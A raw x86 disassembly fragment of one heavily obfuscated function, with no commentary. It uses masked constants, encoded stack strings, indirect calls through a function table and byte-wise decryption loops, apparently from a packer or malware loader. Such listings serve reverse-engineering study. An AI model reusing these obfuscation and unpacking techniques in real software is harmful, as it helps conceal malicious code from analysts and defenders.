  42483c:	mov    edx,DWORD PTR [edx]
  42483e:	add    edx,DWORD PTR [eax+0x88]
  424844:	push   0x4
  424846:	push   DWORD PTR [eax+0x8c]
  42484c:	push   edx
  42484d:	call   DWORD PTR [ecx+0x1c]
  424850:	push   DWORD PTR [ebp+0x8]
  424853:	xor    eax,eax
  424855:	mov    DWORD PTR [ebp-0xa8],0x123f0f35
  42485f:	mov    DWORD PTR [ebp-0xa4],0xb360c1d
  424869:	mov    DWORD PTR [ebp-0xa0],0x3d0c1103
  424873:	mov    BYTE PTR [ebp-0x9c],0x7a
  42487a:	lea    edi,[ebp-0x9b]
  424880:	stos   DWORD PTR es:[edi],eax
  424881:	stos   WORD PTR es:[edi],ax
  424883:	stos   BYTE PTR es:[edi],al
  424884:	xor    eax,eax
  424886:	mov    DWORD PTR [ebp-0xbc],0x123f0f35
  424890:	mov    DWORD PTR [ebp-0xb8],0xb360c1d
  42489a:	mov    DWORD PTR [ebp-0xb4],0x230c1103
  4248a4:	mov    BYTE PTR [ebp-0xb0],0x7a
  4248ab:	lea    edi,[ebp-0xaf]
  4248b1:	stos   DWORD PTR es:[edi],eax
  4248b2:	stos   WORD PTR es:[edi],ax
  4248b4:	stos   BYTE PTR es:[edi],al
  4248b5:	mov    edi,DWORD PTR [ebp+0x8]
  4248b8:	mov    eax,DWORD PTR [ebp+0x8]
  4248bb:	mov    edx,DWORD PTR [eax+0x1b8]
  4248c1:	mov    DWORD PTR [ebp-0x68],0xc0e0f16
  4248c8:	mov    DWORD PTR [ebp-0x64],0x150a091f
  4248cf:	mov    WORD PTR [ebp-0x60],0x7a3d
  4248d5:	mov    DWORD PTR [ebp-0x90],0x123f0f35
  4248df:	mov    DWORD PTR [ebp-0x8c],0x163d0c1d
  4248e9:	mov    DWORD PTR [ebp-0x88],0x281d120a
  4248f3:	mov    DWORD PTR [ebp-0x84],0xc110901
  4248fd:	mov    DWORD PTR [ebp-0x80],0x7a3d1f15
  424904:	mov    DWORD PTR [ebp-0x7c],0x123f0f35
  42490b:	mov    DWORD PTR [ebp-0x78],0x163d0c1d
  424912:	mov    DWORD PTR [ebp-0x74],0x281d120a
  424919:	mov    DWORD PTR [ebp-0x70],0xc110901
  424920:	mov    DWORD PTR [ebp-0x6c],0x7a231f15
  424927:	call   0x426c23
  42492c:	push   eax
  42492d:	mov    eax,DWORD PTR [ebp+0x8]
  424930:	mov    eax,DWORD PTR [eax+0x1a8]
  424936:	push   DWORD PTR [eax]
  424938:	call   0x4268c4
  42493d:	test   eax,eax
  42493f:	jne    0x424991
  424941:	mov    eax,DWORD PTR [ebp+0x8]
  424944:	mov    eax,DWORD PTR [eax+0x1d8]
  42494a:	mov    edi,DWORD PTR [ebp+0x8]
  42494d:	add    eax,0x4
  424950:	mov    DWORD PTR [ebp-0x24],eax
  424953:	mov    eax,DWORD PTR [ebp+0x8]
  424956:	mov    edx,DWORD PTR [eax+0x1b8]
  42495c:	call   0x426c23
  424961:	push   eax
  424962:	mov    eax,DWORD PTR [ebp-0x24]
  424965:	call   DWORD PTR [eax]
  424967:	test   eax,eax
  424969:	jne    0x424991
  42496b:	mov    eax,DWORD PTR [ebp+0x8]
  42496e:	mov    eax,DWORD PTR [eax+0x1d8]
  424974:	mov    edi,DWORD PTR [ebp+0x8]
  424977:	add    eax,0x10
  42497a:	mov    DWORD PTR [ebp-0x24],eax
  42497d:	mov    eax,DWORD PTR [ebp+0x8]
  424980:	mov    edx,DWORD PTR [eax+0x1b8]
  424986:	call   0x426c23
  42498b:	push   eax
  42498c:	mov    eax,DWORD PTR [ebp-0x24]
  42498f:	call   DWORD PTR [eax]
  424991:	mov    eax,DWORD PTR [ebp-0x10]
  424994:	mov    ecx,DWORD PTR [ebp-0x28]
  424997:	xor    eax,ebx
  424999:	add    eax,esi
  42499b:	cmp    eax,ecx
  42499d:	je     0x424b60
  4249a3:	mov    eax,DWORD PTR [ebp-0x18]
  4249a6:	xor    eax,ebx
  4249a8:	mov    ecx,0xffcd8d14
  4249ad:	sub    ecx,eax
  4249af:	add    ecx,DWORD PTR [ebp-0x28]
  4249b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4249b5:	cmp    eax,ecx
  4249b7:	ja     0x424b60
  4249bd:	mov    DWORD PTR [ebp-0x20],0x0
  4249c4:	push   DWORD PTR [ebp+0x8]
  4249c7:	mov    edi,DWORD PTR [ebp+0x8]
  4249ca:	mov    eax,DWORD PTR [ebp+0x8]
  4249cd:	mov    edx,DWORD PTR [eax+0x1b4]
  4249d3:	call   0x426c23
  4249d8:	push   eax
  4249d9:	mov    eax,DWORD PTR [ebp+0x8]
  4249dc:	mov    eax,DWORD PTR [eax+0x1a8]
  4249e2:	push   DWORD PTR [eax]
  4249e4:	call   0x4268c4
  4249e9:	mov    ecx,DWORD PTR [ebp+0x8]
  4249ec:	mov    ecx,DWORD PTR [ecx+0x19c]
  4249f2:	mov    DWORD PTR [ecx],eax
  4249f4:	mov    eax,DWORD PTR [ebp+0x8]
  4249f7:	mov    edi,DWORD PTR [eax+0x1d8]
  4249fd:	mov    esi,DWORD PTR [ebp+0x8]
  424a00:	xor    eax,eax
  424a02:	lea    edx,[ebp-0x7c]
  424a05:	call   0x426c59
  424a0a:	push   eax
  424a0b:	mov    eax,DWORD PTR [ebp+0x8]
  424a0e:	mov    eax,DWORD PTR [eax+0x19c]
  424a14:	push   DWORD PTR [eax]
  424a16:	call   DWORD PTR [edi+0x8]
  424a19:	mov    DWORD PTR [ebp-0x24],eax
  424a1c:	mov    eax,DWORD PTR [ebp+0x8]
  424a1f:	mov    edi,DWORD PTR [eax+0x1d8]
  424a25:	mov    esi,DWORD PTR [ebp+0x8]
  424a28:	xor    eax,eax
  424a2a:	lea    edx,[ebp-0x90]
  424a30:	call   0x426c59
  424a35:	push   eax
  424a36:	mov    eax,DWORD PTR [ebp+0x8]
  424a39:	mov    eax,DWORD PTR [eax+0x19c]
  424a3f:	push   DWORD PTR [eax]
  424a41:	call   DWORD PTR [edi+0x8]
  424a44:	mov    eax,DWORD PTR [ebp+0x8]
  424a47:	mov    edi,DWORD PTR [eax+0x1d8]
  424a4d:	mov    esi,DWORD PTR [ebp+0x8]
  424a50:	xor    eax,eax
  424a52:	lea    edx,[ebp-0xa8]
  424a58:	call   0x426c59
  424a5d:	push   eax
  424a5e:	mov    eax,DWORD PTR [ebp+0x8]
  424a61:	mov    eax,DWORD PTR [eax+0x19c]
  424a67:	push   DWORD PTR [eax]
  424a69:	call   DWORD PTR [edi+0x8]
  424a6c:	and    DWORD PTR [ebp-0x8],0x0
  424a70:	mov    DWORD PTR [ebp-0x44],eax
  424a73:	mov    eax,DWORD PTR [ebp-0x8]
  424a76:	and    eax,0x7
  424a79:	add    eax,0x31
  424a7c:	push   eax
  424a7d:	call   DWORD PTR [ebp-0x24]
  424a80:	test   eax,eax
  424a82:	je     0x424ac6
  424a84:	mov    eax,DWORD PTR [ebp-0x8]
  424a87:	push   0x19
  424a89:	xor    edx,edx
  424a8b:	pop    ecx
  424a8c:	div    ecx
  424a8e:	add    dl,0x41
  424a91:	movzx  eax,dl
  424a94:	push   eax
  424a95:	call   DWORD PTR [ebp-0x44]
  424a98:	test   eax,eax
  424a9a:	jne    0x424ac6
  424a9c:	mov    eax,DWORD PTR [ebp+0x8]
  424a9f:	mov    edi,DWORD PTR [eax+0x1d8]
  424aa5:	mov    esi,DWORD PTR [ebp+0x8]
  424aa8:	xor    eax,eax
  424aaa:	lea    edx,[ebp-0x68]
  424aad:	call   0x426c59
  424ab2:	push   eax
  424ab3:	mov    eax,DWORD PTR [ebp+0x8]
  424ab6:	mov    eax,DWORD PTR [eax+0x198]
  424abc:	push   DWORD PTR [eax]
  424abe:	call   DWORD PTR [edi+0x8]
  424ac1:	mov    DWORD PTR [ebp-0x14],eax
  424ac4:	jmp    0x424aca
  424ac6:	and    DWORD PTR [ebp-0x14],0x0
  424aca:	inc    DWORD PTR [ebp-0x8]
  424acd:	cmp    DWORD PTR [ebp-0x8],0x10
  424ad1:	jb     0x424a73
  424ad3:	mov    eax,DWORD PTR [ebp-0x18]
  424ad6:	mov    esi,DWORD PTR [ebp+0x8]
  424ad9:	xor    eax,ebx
  424adb:	mov    edi,0x3272ec
  424ae0:	add    eax,edi
  424ae2:	lea    edx,[ebp-0x10c]
  424ae8:	call   0x426c59
  424aed:	push   eax
  424aee:	mov    eax,DWORD PTR [ebp-0x10]
  424af1:	mov    esi,DWORD PTR [ebp+0x8]
  424af4:	xor    eax,ebx
  424af6:	add    eax,edi
  424af8:	lea    edx,[ebp-0x12c]
  424afe:	call   0x426c59
  424b03:	push   eax
  424b04:	call   DWORD PTR [ebp-0x14]
  424b07:	mov    ecx,DWORD PTR [ebp-0x10]
  424b0a:	xor    ecx,ebx
  424b0c:	add    ecx,edi
  424b0e:	cmp    ecx,eax
  424b10:	jne    0x424b19
  424b12:	mov    DWORD PTR [ebp-0x20],0x1
  424b19:	mov    eax,DWORD PTR [ebp-0x18]
  424b1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  424b1f:	xor    eax,ebx
  424b21:	lea    eax,[eax+ecx*1+0x3272ec]
  424b28:	mov    DWORD PTR [ebp-0x1c],eax
  424b2b:	mov    eax,DWORD PTR [ebp-0x20]
  424b2e:	test   eax,eax
  424b30:	je     0x424b44
  424b32:	mov    eax,DWORD PTR [ebp-0x18]
  424b35:	mov    ecx,DWORD PTR [ebp-0x34]
  424b38:	xor    eax,ebx
  424b3a:	lea    eax,[eax+ecx*1+0x3272ec]
  424b41:	mov    DWORD PTR [ebp-0x34],eax
  424b44:	mov    eax,DWORD PTR [ebp-0x18]
  424b47:	xor    eax,ebx
  424b49:	mov    ecx,0xffcd8d14
  424b4e:	sub    ecx,eax
  424b50:	add    ecx,DWORD PTR [ebp-0x28]
  424b53:	mov    eax,DWORD PTR [ebp-0x1c]
  424b56:	cmp    eax,ecx
  424b58:	jbe    0x4249bd
  424b5e:	mov    esi,edi
  424b60:	mov    eax,DWORD PTR [ebp-0x34]
  424b63:	mov    ecx,DWORD PTR [ebp-0x1c]
  424b66:	cmp    ecx,eax
  424b68:	jne    0x424b7b
  424b6a:	push   DWORD PTR [ebp+0x8]
  424b6d:	lea    eax,[ebp-0x3c]
  424b70:	push   eax
  424b71:	call   0x4276c9
  424b76:	mov    DWORD PTR [ebp-0x2c],eax
  424b79:	jmp    0x424b87
  424b7b:	mov    eax,DWORD PTR [ebp-0x2c]
  424b7e:	mov    ecx,DWORD PTR [ebp-0x18]
  424b81:	xor    ecx,ebx
  424b83:	add    ecx,esi
  424b85:	xor    DWORD PTR [eax],ecx
  424b87:	mov    eax,DWORD PTR [ebp-0x10]
  424b8a:	mov    ecx,DWORD PTR [ebp-0x2c]
  424b8d:	xor    eax,ebx
  424b8f:	add    eax,esi
  424b91:	cmp    eax,ecx
  424b93:	je     0x42530d
  424b99:	mov    eax,DWORD PTR [ebp-0x10]
  424b9c:	mov    ecx,DWORD PTR [ebp-0x3c]
  424b9f:	xor    eax,ebx
  424ba1:	add    eax,esi
  424ba3:	cmp    eax,ecx
  424ba5:	je     0x42530d
  424bab:	mov    eax,DWORD PTR [ebp-0x10]
  424bae:	xor    eax,ebx
  424bb0:	add    eax,esi
  424bb2:	jmp    0x424bd0
  424bb4:	mov    edi,DWORD PTR [ebp-0x2c]
  424bb7:	mov    cl,al
  424bb9:	and    cl,0x1f
  424bbc:	or     dl,0xff
  424bbf:	sub    dl,cl
  424bc1:	add    BYTE PTR [edi+eax*1],dl
  424bc4:	mov    ecx,DWORD PTR [ebp-0x18]
  424bc7:	xor    ecx,ebx
  424bc9:	lea    eax,[eax+ecx*1+0x3272ec]
  424bd0:	mov    ecx,DWORD PTR [ebp-0x3c]
  424bd3:	cmp    eax,ecx
  424bd5:	jb     0x424bb4
  424bd7:	mov    eax,DWORD PTR [ebp-0x3c]
  424bda:	mov    DWORD PTR [ebp-0x28],eax
  424bdd:	mov    eax,DWORD PTR [ebp-0x2c]
  424be0:	mov    DWORD PTR [ebp-0x34],0xf89c85b0
  424be7:	mov    DWORD PTR [ebp-0xd4],eax
  424bed:	mov    edi,0xf89c85b1
  424bf2:	mov    DWORD PTR [ebp-0x30],edi
  424bf5:	mov    eax,DWORD PTR [ebp-0x34]
  424bf8:	xor    eax,ebx
  424bfa:	add    eax,esi
  424bfc:	mov    DWORD PTR [ebp-0xc],eax
  424bff:	mov    eax,DWORD PTR [ebp-0x34]
  424c02:	xor    eax,ebx
  424c04:	add    eax,esi
  424c06:	mov    DWORD PTR [ebp-0x8],eax
  424c09:	mov    DWORD PTR [ebp-0x44],0xf89c8590
  424c10:	mov    DWORD PTR [ebp-0x4c],0xf89c85bf
  424c17:	mov    eax,DWORD PTR [ebp-0x34]
  424c1a:	mov    ecx,DWORD PTR [ebp-0x28]
  424c1d:	xor    eax,ebx
  424c1f:	add    eax,esi
  424c21:	cmp    ecx,eax
  424c23:	je     0x424e22
  424c29:	jmp    0x424dfe
  424c2e:	mov    ecx,DWORD PTR [ebp-0xc]
  424c31:	mov    eax,DWORD PTR [ebp-0x28]
  424c34:	sub    eax,ecx
  424c36:	mov    ecx,DWORD PTR [ebp-0x44]
  424c39:	xor    ecx,ebx
  424c3b:	add    ecx,esi
  424c3d:	xor    edx,edx
  424c3f:	div    ecx
  424c41:	mov    DWORD PTR [ebp-0x8],eax
  424c44:	mov    eax,DWORD PTR [ebp-0x4c]
  424c47:	mov    ecx,DWORD PTR [ebp-0x8]
  424c4a:	xor    eax,ebx
  424c4c:	add    eax,esi
  424c4e:	cmp    ecx,eax
  424c50:	jbe    0x424c5c
  424c52:	mov    eax,DWORD PTR [ebp-0x4c]
  424c55:	xor    eax,ebx
  424c57:	add    eax,esi
  424c59:	mov    DWORD PTR [ebp-0x8],eax
  424c5c:	mov    eax,DWORD PTR [ebp-0x44]
  424c5f:	mov    ecx,DWORD PTR [ebp-0x8]
  424c62:	xor    eax,ebx
  424c64:	add    eax,esi
  424c66:	imul   eax,ecx
  424c69:	mov    DWORD PTR [ebp-0x8],eax
  424c6c:	mov    eax,DWORD PTR [ebp-0x34]
  424c6f:	mov    ecx,DWORD PTR [ebp-0x8]
  424c72:	xor    eax,ebx
  424c74:	add    eax,esi
  424c76:	cmp    ecx,eax
  424c78:	je     0x424dec
  424c7e:	mov    eax,DWORD PTR [ebp-0x8]
  424c81:	mov    DWORD PTR [ebp-0x14],eax
  424c84:	mov    eax,DWORD PTR [ebp-0xc]
  424c87:	add    eax,DWORD PTR [ebp-0xd4]
  424c8d:	mov    DWORD PTR [ebp-0x24],0xf89c85b0
  424c94:	mov    DWORD PTR [ebp-0x20],edi
  424c97:	mov    DWORD PTR [ebp-0xe8],0xf89c85b2
  424ca1:	mov    DWORD PTR [ebp-0x8],eax
  424ca4:	mov    DWORD PTR [ebp-0x38],0xf89c85b3
  424cab:	mov    DWORD PTR [ebp-0x1c],edi
  424cae:	mov    eax,DWORD PTR [ebp-0x24]
  424cb1:	xor    eax,ebx
  424cb3:	add    eax,esi
  424cb5:	jmp    0x424dab
  424cba:	mov    DWORD PTR [ebp-0xe0],0xf89c85bb
  424cc4:	mov    DWORD PTR [ebp-0xc4],0xf89c858e
  424cce:	mov    eax,DWORD PTR [ebp-0x1c]
  424cd1:	mov    ecx,DWORD PTR [ebp-0x48]
  424cd4:	xor    eax,ebx
  424cd6:	add    eax,esi
  424cd8:	imul   eax,ecx
  424cdb:	mov    ecx,DWORD PTR [ebp-0x8]
  424cde:	mov    al,BYTE PTR [eax+ecx*1]
  424ce1:	mov    BYTE PTR [ebp-0x2],al
  424ce4:	mov    eax,DWORD PTR [ebp-0x1c]
  424ce7:	mov    ecx,DWORD PTR [ebp-0x48]
  424cea:	xor    eax,ebx
  424cec:	add    eax,esi
  424cee:	imul   eax,ecx
  424cf1:	mov    ecx,DWORD PTR [ebp-0xe8]
  424cf7:	xor    ecx,ebx
  424cf9:	add    eax,ecx
  424cfb:	mov    ecx,DWORD PTR [ebp-0x8]
  424cfe:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424d06:	mov    ecx,DWORD PTR [ebp-0xe0]
  424d0c:	xor    ecx,ebx
  424d0e:	lea    eax,[ecx+eax*1+0x3272ec]
  424d15:	movzx  ecx,BYTE PTR [ebp-0x2]
  424d19:	xor    ecx,eax
  424d1b:	mov    BYTE PTR [ebp-0x2],cl
  424d1e:	mov    al,BYTE PTR [ebp-0x2]
  424d21:	mov    ecx,DWORD PTR [ebp-0x1c]
  424d24:	mov    edx,DWORD PTR [ebp-0x48]
  424d27:	xor    ecx,ebx
  424d29:	add    ecx,esi
  424d2b:	imul   ecx,edx
  424d2e:	mov    edx,DWORD PTR [ebp-0x8]
  424d31:	mov    BYTE PTR [ecx+edx*1],al
  424d34:	mov    eax,DWORD PTR [ebp-0x1c]
  424d37:	mov    ecx,DWORD PTR [ebp-0x48]
  424d3a:	xor    eax,ebx
  424d3c:	add    eax,esi
  424d3e:	imul   eax,ecx
  424d41:	mov    ecx,DWORD PTR [ebp-0x8]
  424d44:	mov    al,BYTE PTR [eax+ecx*1]
  424d47:	mov    BYTE PTR [ebp-0x2],al
  424d4a:	mov    eax,DWORD PTR [ebp-0x1c]
  424d4d:	mov    ecx,DWORD PTR [ebp-0x48]
  424d50:	xor    eax,ebx
  424d52:	add    eax,esi
  424d54:	imul   eax,ecx
  424d57:	mov    ecx,DWORD PTR [ebp-0x20]
  424d5a:	xor    ecx,ebx
  424d5c:	add    eax,ecx
  424d5e:	mov    ecx,DWORD PTR [ebp-0x8]
  424d61:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272ec]
  424d69:	mov    ecx,DWORD PTR [ebp-0xc4]
  424d6f:	xor    ecx,ebx
  424d71:	lea    eax,[ecx+eax*1+0x3272ec]
  424d78:	movzx  ecx,BYTE PTR [ebp-0x2]
  424d7c:	xor    ecx,eax
  424d7e:	mov    BYTE PTR [ebp-0x2],cl
  424d81:	mov    al,BYTE PTR [ebp-0x2]
  424d84:	mov    ecx,DWORD PTR [ebp-0x1c]
  424d87:	mov    edx,DWORD PTR [ebp-0x48]
  424d8a:	xor    ecx,ebx
  424d8c:	add    ecx,esi
  424d8e:	imul   ecx,edx
  424d91:	mov    edx,DWORD PTR [ebp-0x8]
  424d94:	mov    BYTE PTR [ecx+edx*1],al
  424d97:	mov    eax,DWORD PTR [ebp-0x38]
  424d9a:	mov    ecx,DWORD PTR [ebp-0x20]
  424d9d:	xor    eax,ebx
  424d9f:	xor    ecx,ebx
  424da1:	add    eax,esi
  424da3:	add    ecx,esi
  424da5:	imul   eax,ecx
  424da8:	add    eax,DWORD PTR [ebp-0x48]
  424dab:	mov    DWORD PTR [ebp-0x48],eax
  424dae:	mov    eax,DWORD PTR [ebp-0x48]
  424db1:	mov    ecx,DWORD PTR [ebp-0x14]
  424db4:	cmp    ecx,eax
  424db6:	jb     0x424cba
  424dbc:	mov    eax,DWORD PTR [ebp-0x20]
  424dbf:	mov    ecx,DWORD PTR [ebp-0x14]
  424dc2:	xor    eax,ebx
  424dc4:	add    eax,esi
  424dc6:	imul   eax,ecx
  424dc9:	mov    ecx,DWORD PTR [ebp-0x24]
  424dcc:	xor    ecx,ebx
  424dce:	add    ecx,esi
  424dd0:	or     eax,ecx
  424dd2:	mov    ecx,DWORD PTR [ebp-0x30]
  424dd5:	xor    ecx,ebx
  424dd7:	add    eax,ecx
  424dd9:	mov    ecx,DWORD PTR [ebp-0x30]
  424ddc:	xor    ecx,ebx
  424dde:	add    eax,ecx
  424de0:	mov    ecx,DWORD PTR [ebp-0xc]
  424de3:	lea    eax,[eax+ecx*1+0x64e5d8]
  424dea:	jmp    0x424dfb
  424dec:	mov    eax,DWORD PTR [ebp-0x30]
  424def:	mov    ecx,DWORD PTR [ebp-0xc]
  424df2:	xor    eax,ebx
  424df4:	lea    eax,[eax+ecx*1+0x3272ec]
  424dfb:	mov    DWORD PTR [ebp-0xc],eax
  424dfe:	mov    eax,DWORD PTR [ebp-0x30]
  424e01:	xor    eax,ebx
  424e03:	mov    ecx,0xffcd8d14
  424e08:	sub    ecx,eax
  424e0a:	add    ecx,DWORD PTR [ebp-0x28]
  424e0d:	mov    eax,DWORD PTR [ebp-0x30]
  424e10:	mov    edx,DWORD PTR [ebp-0xc]
  424e13:	xor    eax,ebx
  424e15:	add    eax,esi
  424e17:	imul   eax,edx
  424e1a:	cmp    eax,ecx
  424e1c:	jbe    0x424c2e
  424e22:	mov    eax,DWORD PTR [ebp-0x10]
  424e25:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e28:	mov    eax,DWORD PTR [ebp+0x8]
  424e2b:	mov    edx,DWORD PTR [ebp-0x54]
  424e2e:	mov    eax,DWORD PTR [eax+0x1d8]
  424e34:	xor    edx,ebx
  424e36:	add    edx,esi
  424e38:	push   edx
  424e39:	mov    edx,DWORD PTR [ebp-0x40]
  424e3c:	xor    edx,ebx
  424e3e:	add    edx,esi
  424e40:	push   edx
  424e41:	push   ecx
  424e42:	mov    DWORD PTR [ebp-0x38],ecx
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	xor    ecx,ebx
  424e4a:	add    ecx,esi
  424e4c:	push   ecx
  424e4d:	call   DWORD PTR [eax+0x14]
  424e50:	mov    edi,eax
  424e52:	mov    eax,DWORD PTR [ebp-0x10]
  424e55:	xor    eax,ebx
  424e57:	add    eax,esi
  424e59:	cmp    eax,edi
  424e5b:	je     0x424eb6
  424e5d:	mov    eax,DWORD PTR [ebp-0x10]
  424e60:	jmp    0x424e83
  424e62:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e65:	xor    eax,ebx
  424e67:	mov    cl,BYTE PTR [ecx+eax*1+0x3272ec]
  424e6e:	mov    BYTE PTR [eax+edi*1+0x3272ec],cl
  424e75:	mov    ecx,DWORD PTR [ebp-0x18]
  424e78:	xor    ecx,ebx
  424e7a:	lea    eax,[ecx+eax*1+0x3272ec]
  424e81:	xor    eax,ebx
  424e83:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e86:	sub    ecx,esi
  424e88:	xor    ecx,ebx
  424e8a:	cmp    eax,ecx
  424e8c:	jne    0x424e62
  424e8e:	mov    eax,DWORD PTR [ebp+0x8]
  424e91:	mov    ecx,DWORD PTR [ebp-0x50]
  424e94:	mov    eax,DWORD PTR [eax+0x1d8]
  424e9a:	xor    ecx,ebx
  424e9c:	add    ecx,esi
  424e9e:	push   ecx
  424e9f:	mov    ecx,DWORD PTR [ebp-0x10]
  424ea2:	xor    ecx,ebx
  424ea4:	add    ecx,esi
  424ea6:	push   ecx
  424ea7:	push   DWORD PTR [ebp-0x2c]
  424eaa:	call   DWORD PTR [eax+0x18]
  424ead:	mov    eax,DWORD PTR [ebp-0x38]
  424eb0:	mov    DWORD PTR [ebp-0x2c],edi
  424eb3:	mov    DWORD PTR [ebp-0x3c],eax
  424eb6:	mov    eax,DWORD PTR [ebp-0x2c]
  424eb9:	mov    DWORD PTR [ebp-0x14],eax
  424ebc:	mov    eax,DWORD PTR [ebp-0x18]
  424ebf:	mov    ecx,DWORD PTR [ebp-0x10]
  424ec2:	xor    eax,ebx
  424ec4:	add    eax,esi
  424ec6:	mov    DWORD PTR [ebp-0x5c],0x3d222a22
  424ecd:	mov    DWORD PTR [ebp-0x58],0x37223f22
  424ed4:	jmp    0x424f07
  424ed6:	mov    edx,DWORD PTR [ebp-0x14]
  424ed9:	mov    edi,ecx
  424edb:	xor    edi,ebx
  424edd:	mov    cl,BYTE PTR [ebp+edi*1+0x327290]
  424ee4:	movsx  edx,BYTE PTR [edi+edx*1+0x3272ec]
  424eec:	xor    cl,0x79
  424eef:	sub    cl,0x3
  424ef2:	movzx  ecx,cl
  424ef5:	cmp    edx,ecx
  424ef7:	jne    0x424f11
  424ef9:	mov    ecx,DWORD PTR [ebp-0x18]
  424efc:	xor    ecx,ebx
  424efe:	lea    ecx,[ecx+edi*1+0x3272ec]
  424f05:	xor    ecx,ebx
  424f07:	cmp    ecx,0xf89c85b8
  424f0d:	jne    0x424ed6
  424f0f:	jmp    0x424f18
  424f11:	mov    eax,DWORD PTR [ebp-0x10]
  424f14:	xor    eax,ebx
  424f16:	add    eax,esi
  424f18:	mov    ecx,DWORD PTR [ebp-0x10]
  424f1b:	xor    ecx,ebx
  424f1d:	add    ecx,esi
  424f1f:	cmp    ecx,eax
  424f21:	je     0x425097
  424f27:	mov    eax,DWORD PTR [ebp-0x14]
  424f2a:	mov    eax,DWORD PTR [eax+0x8]
  424f2d:	mov    DWORD PTR [ebp-0xc],0xf89c85b0
  424f34:	mov    DWORD PTR [ebp-0x40],0xf89cc327
  424f3b:	mov    DWORD PTR [ebp-0x44],0xf89cb5b0
  424f42:	mov    DWORD PTR [ebp-0x24],0xf89c85bc
  424f49:	mov    DWORD PTR [ebp-0x20],eax
  424f4c:	mov    eax,DWORD PTR [ebp+0x8]
  424f4f:	mov    ecx,DWORD PTR [ebp-0x24]
  424f52:	xor    ecx,ebx
  424f54:	add    ecx,esi
  424f56:	push   ecx
  424f57:	mov    ecx,DWORD PTR [ebp-0x44]
  424f5a:	mov    eax,DWORD PTR [eax+0x1d8]
  424f60:	xor    ecx,ebx
  424f62:	add    ecx,esi
  424f64:	push   ecx
  424f65:	mov    ecx,DWORD PTR [ebp-0x40]
  424f68:	xor    ecx,ebx
  424f6a:	add    ecx,esi
  424f6c:	push   ecx
  424f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  424f70:	xor    ecx,ebx
  424f72:	add    ecx,esi
  424f74:	push   ecx
  424f75:	call   DWORD PTR [eax+0x14]
  424f78:	mov    edi,eax
  424f7a:	mov    eax,DWORD PTR [ebp+0x8]
  424f7d:	mov    ecx,DWORD PTR [ebp-0x24]
  424f80:	mov    eax,DWORD PTR [eax+0x1d8]
  424f86:	xor    ecx,ebx
  424f88:	add    ecx,esi
  424f8a:	push   ecx
  424f8b:	mov    ecx,DWORD PTR [ebp-0x44]
  424f8e:	xor    ecx,ebx
  424f90:	add    ecx,esi
  424f92:	push   ecx
  424f93:	mov    ecx,DWORD PTR [ebp-0xc]
  424f96:	push   DWORD PTR [ebp-0x20]
  424f99:	xor    ecx,ebx
  424f9b:	add    ecx,esi
  424f9d:	push   ecx
  424f9e:	call   DWORD PTR [eax+0x14]
  424fa1:	mov    ecx,DWORD PTR [ebp-0xc]
  424fa4:	xor    ecx,ebx
  424fa6:	add    ecx,esi
  424fa8:	mov    DWORD PTR [ebp-0x24],eax
  424fab:	cmp    ecx,edi
  424fad:	je     0x42533a
  424fb3:	mov    ecx,DWORD PTR [ebp-0xc]
  424fb6:	xor    ecx,ebx
  424fb8:	add    ecx,esi
  424fba:	cmp    ecx,eax
  424fbc:	je     0x42533a
  424fc2:	mov    DWORD PTR [ebp-0x40],0xf89c85b3
  424fc9:	mov    DWORD PTR [ebp-0x54],0xf89c85b2
  424fd0:	mov    ecx,DWORD PTR [ebp-0x40]
  424fd3:	xor    cl,0xa4
  424fd6:	sub    cl,0x14
  424fd9:	mov    BYTE PTR [edi],cl
  424fdb:	mov    ecx,DWORD PTR [ebp-0xc]
  424fde:	xor    cl,0xa4
  424fe1:	sub    cl,0x14
  424fe4:	mov    BYTE PTR [edi+0x1],cl
  424fe7:	mov    ecx,DWORD PTR [ebp-0x54]
  424fea:	xor    cl,0xa4
  424fed:	sub    cl,0x14
  424ff0:	mov    BYTE PTR [edi+0x2],cl
  424ff3:	and    DWORD PTR [ebp-0xc8],0x0
  424ffa:	and    DWORD PTR [ebp-0xdc],0x0
  425001:	lea    ecx,[ebp-0xdc]
  425007:	push   ecx
  425008:	push   DWORD PTR [ebp-0x20]
  42500b:	push   eax
  42500c:	lea    eax,[ebp-0xc8]
  425012:	push   eax
  425013:	mov    eax,DWORD PTR [ebp-0x14]
  425016:	push   DWORD PTR [eax+0xc]
  425019:	mov    eax,DWORD PTR [ebp-0x2c]
  42501c:	add    eax,0x10
  42501f:	push   eax
  425020:	push   edi
  425021:	call   0x4242c5
  425026:	mov    DWORD PTR [ebp-0x40],eax
  425029:	mov    eax,DWORD PTR [ebp+0x8]
  42502c:	mov    ecx,DWORD PTR [ebp-0x50]
  42502f:	mov    eax,DWORD PTR [eax+0x1d8]
  425035:	xor    ecx,ebx
  425037:	add    ecx,esi
  425039:	push   ecx
  42503a:	mov    ecx,DWORD PTR [ebp-0xc]
  42503d:	xor    ecx,ebx
  42503f:	add    ecx,esi
  425041:	push   ecx
  425042:	push   edi
  425043:	call   DWORD PTR [eax+0x18]
  425046:	mov    eax,DWORD PTR [ebp-0x40]
  425049:	add    eax,0xffcd8d14
  42504e:	xor    eax,ebx
  425050:	cmp    eax,0xf89c85b0
  425055:	mov    eax,DWORD PTR [ebp+0x8]
  425058:	mov    eax,DWORD PTR [eax+0x1d8]
  42505e:	mov    ecx,DWORD PTR [ebp-0x50]
  425061:	jne    0x425084
  425063:	xor    ecx,ebx
  425065:	add    ecx,esi
  425067:	push   ecx
  425068:	mov    ecx,DWORD PTR [ebp-0xc]
  42506b:	xor    ecx,ebx
  42506d:	add    ecx,esi
  42506f:	push   ecx
  425070:	push   DWORD PTR [ebp-0x2c]
  425073:	call   DWORD PTR [eax+0x18]
  425076:	mov    eax,DWORD PTR [ebp-0x24]
  425079:	mov    DWORD PTR [ebp-0x2c],eax
  42507c:	mov    eax,DWORD PTR [ebp-0x20]
  42507f:	mov    DWORD PTR [ebp-0x3c],eax
  425082:	jmp    0x425097
  425084:	xor    ecx,ebx
  425086:	add    ecx,esi
  425088:	push   ecx
  425089:	mov    ecx,DWORD PTR [ebp-0xc]
  42508c:	xor    ecx,ebx
  42508e:	add    ecx,esi
  425090:	push   ecx
